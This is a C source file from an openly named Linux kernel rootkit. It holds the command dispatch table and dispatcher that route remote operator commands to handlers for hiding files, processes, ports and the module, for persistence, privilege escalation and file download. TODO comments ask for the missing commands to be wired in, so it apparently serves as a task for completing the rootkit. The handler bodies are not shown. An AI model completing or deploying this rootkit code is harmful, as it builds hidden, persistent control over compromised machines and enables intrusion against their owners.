// SPDX-License-Identifier: GPL-2.0
// execution/dispatch.c - Function pointer dispatch table for all commands.
#include <linux/string.h>

#include "rootkit.h"

// Forward declarations for command handlers (execution/commands.c)
int rk_cmd_ping(struct rk_session *s, const char *arg);
int rk_cmd_info(struct rk_session *s, const char *arg);
int rk_cmd_status(struct rk_session *s, const char *arg);
int rk_cmd_list(struct rk_session *s, const char *category);
int rk_cmd_hide_file(struct rk_session *s, const char *arg);
int rk_cmd_hide_pid(struct rk_session *s, const char *arg);
int rk_cmd_hide_content(struct rk_session *s, const char *arg);
int rk_cmd_hide_port(struct rk_session *s, const char *arg);
int rk_cmd_unhide_file(struct rk_session *s, const char *arg);
int rk_cmd_unhide_pid(struct rk_session *s, const char *arg);
int rk_cmd_unhide_content(struct rk_session *s, const char *arg);
int rk_cmd_unhide_port(struct rk_session *s, const char *arg);
int rk_cmd_unhide_all(struct rk_session *s, const char *arg);
int rk_cmd_hide_module(struct rk_session *s, const char *arg);
int rk_cmd_unhide_module(struct rk_session *s, const char *arg);
int rk_cmd_persist(struct rk_session *s, const char *arg);
int rk_cmd_unpersist(struct rk_session *s, const char *arg);
int rk_cmd_escalate(struct rk_session *s, const char *arg);
int rk_cmd_download(struct rk_session *s, const char *path);

/*
 * Command table: longer prefixes first to avoid ambiguity.
 *
 * Each entry maps a command prefix string to its handler function pointer.
 * If exact is true, the command must match the prefix exactly.
 * If exact is false, the prefix is stripped and the remainder is passed
 * as the arg parameter to the handler.
 *
 * TODO: Some entries are missing from the table below.
 *       Wire ALL commands: STATUS, HIDE PID, HIDE CONTENT,
 *       UNHIDE PID, UNHIDE CONTENT, UNHIDE PORT,
 *       ESCALATE, and DOWNLOAD.
 */
static const struct rk_cmd_entry cmd_table[] = {
	{ "PING",            rk_cmd_ping,           true  },
	{ "INFO",            rk_cmd_info,           true  },
	/* TODO: Wire STATUS here */
	{ "UNHIDE ALL",      rk_cmd_unhide_all,     true  },
	{ "UNHIDE MODULE",   rk_cmd_unhide_module,  true  },
	{ "UNHIDE CONTENT ", rk_cmd_unhide_content, false },
	{ "UNHIDE FILE ",    rk_cmd_unhide_file,    false },
	/* TODO: Wire UNHIDE PID here */
	/* TODO: Wire UNHIDE PORT here */
	{ "HIDE MODULE",     rk_cmd_hide_module,    true  },
	/* TODO: Wire HIDE CONTENT here */
	{ "HIDE FILE ",      rk_cmd_hide_file,      false },
	/* TODO: Wire HIDE PID here */
	{ "HIDE PORT ",      rk_cmd_hide_port,      false },
	{ "PERSIST",         rk_cmd_persist,        true  },
	{ "UNPERSIST",       rk_cmd_unpersist,      true  },
	/* TODO: Wire ESCALATE here */
	{ "LIST ",           rk_cmd_list,           false },
	/* TODO: Wire DOWNLOAD here */
};

// Strip trailing whitespace/newlines from command buffer.
static size_t rk_strip(char *cmd, size_t len)
{
	while (len > 0 && (cmd[len - 1] == '\n' || cmd[len - 1] == '\r' ||
			   cmd[len - 1] == ' '))
		len--;
	cmd[len] = '\0';
	return len;
}

// Walk the command table, match prefix, call handler.
int rk_dispatch(struct rk_session *s, char *cmd, size_t len)
{
	size_t plen;
	int i;

	len = rk_strip(cmd, len);
	if (len == 0)
		return rk_send_sealed(s, (const u8 *)"empty command", 13);

	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
		const struct rk_cmd_entry *e = &cmd_table[i];

		plen = strlen(e->prefix);
		if (e->exact) {
			if (len == plen && memcmp(cmd, e->prefix, plen) == 0)
				return e->handler(s, NULL);
		} else if (len >= plen && memcmp(cmd, e->prefix, plen) == 0) {
			return e->handler(s, cmd + plen);
		}
	}

	return rk_send_sealed(s, (const u8 *)"unknown command", 15);
}
